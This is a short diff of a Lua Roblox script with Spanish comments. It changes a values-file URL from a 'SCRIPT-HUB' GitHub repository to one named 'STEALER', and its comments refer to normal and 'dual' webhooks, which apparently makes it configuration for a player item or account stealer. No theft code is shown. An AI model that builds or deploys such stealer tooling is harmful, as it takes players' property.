@@ -11,7 +11,7 @@ local player = Players.LocalPlayer
 -- URL DE VALORES PRINCIPAL (webhook normal)
 -- ==========================================
 -- NOTA: Se usa raw.githubusercontent.com para que devuelva solo el JSON puro
-local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/main/utils5.json"
+local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
 
 -- ==========================================
 -- URL DE VALORES EXCLUSIVA PARA DUAL WEBHOOK
